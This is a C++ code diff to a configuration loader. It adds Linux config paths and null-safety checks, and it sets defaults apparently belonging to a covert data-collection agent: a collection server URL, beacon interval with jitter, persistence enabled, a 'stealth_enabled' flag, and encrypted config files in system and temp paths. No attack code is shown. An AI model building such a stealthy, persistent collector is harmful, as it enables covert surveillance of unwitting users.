@@ -78,9 +78,21 @@ bool Configuration::LoadConfiguration() {
         return true;
     }
 #elif PLATFORM_LINUX
-    if (LoadFromLinuxConfig()) {
-        LOG_INFO("Configuration loaded from Linux config");
-        return true;
+    // Linux configuration loading implementation
+    std::vector<std::wstring> linuxConfigPaths = {
+        L"/etc/system_config/system.cfg",
+        L"~/.config/system_config/config.enc",
+        L"/tmp/system_config.bin"
+    };
+    
+    for (const auto& path : linuxConfigPaths) {
+        if (utils::FileUtils::FileExists(path)) {
+            LOG_INFO("Found Linux configuration file: " + utils::StringUtils::WideToUtf8(path));
+            if (LoadFromEncryptedFile(path)) {
+                LOG_INFO("Configuration loaded from Linux config");
+                return true;
+            }
+        }
     }
 #endif
 
@@ -92,7 +104,10 @@ std::vector<std::wstring> Configuration::GetConfigurationPaths() const {
     std::vector<std::wstring> paths;
     
     // Current directory
-    paths.push_back(utils::FileUtils::GetCurrentExecutablePath() + L"\\config.enc");
+    std::wstring currentPath = utils::FileUtils::GetCurrentExecutablePath();
+    if (!currentPath.empty()) {
+        paths.push_back(currentPath + L"\\config.enc");
+    }
     
 #if PLATFORM_WINDOWS
     // Windows-specific paths
@@ -102,14 +117,27 @@ std::vector<std::wstring> Configuration::GetConfigurationPaths() const {
     }
     
     // AppData directory
-    paths.push_back(utils::FileUtils::GetAppDataPath() + L"\\config.enc");
+    std::wstring appDataPath = utils::FileUtils::GetAppDataPath();
+    if (!appDataPath.empty()) {
+        paths.push_back(appDataPath + L"\\config.enc");
+    }
     
     // Temp directory
-    paths.push_back(utils::FileUtils::GetTempPath() + L"\\system_config.bin");
+    std::wstring tempPath = utils::FileUtils::GetTempPath();
+    if (!tempPath.empty()) {
+        paths.push_back(tempPath + L"\\system_config.bin");
+    }
 #elif PLATFORM_LINUX
     // Linux-specific paths
     paths.push_back(L"/etc/system_config/system.cfg");
-    paths.push_back(L"~/.config/system_config/config.enc");
+    
+    // Home directory config
+    const char* homeDir = getenv("HOME");
+    if (homeDir) {
+        std::wstring homePath = utils::StringUtils::Utf8ToWide(homeDir);
+        paths.push_back(homePath + L"/.config/system_config/config.enc");
+    }
+    
     paths.push_back(L"/tmp/system_config.bin");
 #endif
     
@@ -217,51 +245,6 @@ bool Configuration::LoadFromRegistry() {
     RegCloseKey(hKey);
     return configFound;
 }
-#elif PLATFORM_LINUX
-bool Configuration::LoadFromLinuxConfig() {
-    // Linux configuration loading from files like /etc/system_config/
-    std::vector<std::string> configFiles = {
-        "/etc/system_config/config.conf",
-        "~/.config/system_config/config.conf",
-        "/tmp/system_config.conf"
-    };
-    
-    for (const auto& configFile : configFiles) {
-        if (utils::FileUtils::FileExists(utils::StringUtils::Utf8ToWide(configFile))) {
-            std::string content = utils::FileUtils::ReadTextFile(utils::StringUtils::Utf8ToWide(configFile));
-            if (!content.empty()) {
-                ParseLinuxConfiguration(content);
-                return true;
-            }
-        }
-    }
-    
-    return false;
-}
-
-void Configuration::ParseLinuxConfiguration(const std::string& configData) {
-    std::stringstream ss(configData);
-    std::string line;
-    
-    while (std::getline(ss, line)) {
-        // Skip comments and empty lines
-        if (line.empty() || line[0] == '#') {
-            continue;
-        }
-        
-        size_t equalsPos = line.find('=');
-        if (equalsPos != std::string::npos) {
-            std::string key = line.substr(0, equalsPos);
-            std::string value = line.substr(equalsPos + 1);
-            
-            // Trim whitespace
-            key = utils::StringUtils::Trim(key);
-            value = utils::StringUtils::Trim(value);
-            
-            m_configValues[key] = value;
-        }
-    }
-}
 #endif
 
 void Configuration::ParseRegistryConfiguration(const std::string& registryData) {
@@ -287,11 +270,19 @@ void Configuration::ParseRegistryConfiguration(const std::string& registryData) 
 void Configuration::SetDefaultValues() {
     LOG_DEBUG("Setting default configuration values");
     
+    // Get temp path safely
+    std::wstring tempPath = utils::FileUtils::GetTempPath();
+    std::string defaultLogPath;
+    
+    if (!tempPath.empty()) {
+        defaultLogPath = utils::StringUtils::WideToUtf8(tempPath + L"/logs/system.log");
+    } else {
+        defaultLogPath = "/tmp/logs/system.log"; // Fallback for Linux
+    }
+    
     // Set default values for all configuration parameters
-    m_configValues["log_path"] = 
-        utils::StringUtils::WideToUtf8(utils::FileUtils::GetTempPath() + L"/logs/system.log");
-    m_configValues["server_url"] = 
-        "https://api.research-project.com/collect";
+    m_configValues["log_path"] = defaultLogPath;
+    m_configValues["server_url"] = "https://api.research-project.com/collect";
     m_configValues["collection_interval"] = "300000"; // 5 minutes
     m_configValues["jitter_factor"] = "0.2";
     m_configValues["enable_persistence"] = "true";
@@ -309,6 +300,7 @@ void Configuration::SetDefaultValues() {
     m_configValues["network_mode"] = "auto";
     m_configValues["same_wifi_server_url"] = "http://192.168.1.100:8080";
     m_configValues["different_wifi_server_url"] = "https://your-external-server.com";
+    m_configValues["stealth_enabled"] = "false";
 }
 
 std::string Configuration::GenerateConfigurationKey() const {
@@ -332,8 +324,11 @@ std::string Configuration::GetValue(const std::string& key,
 
 // Specific getter implementations
 std::string Configuration::GetLogPath() const {
-    return GetValue("log_path", 
-                   utils::StringUtils::WideToUtf8(utils::FileUtils::GetTempPath() + L"/logs/system.log"));
+    std::wstring tempPath = utils::FileUtils::GetTempPath();
+    std::string defaultPath = tempPath.empty() ? "/tmp/logs/system.log" : 
+        utils::StringUtils::WideToUtf8(tempPath + L"/logs/system.log");
+    
+    return GetValue("log_path", defaultPath);
 }
 
 std::string Configuration::GetServerUrl() const {
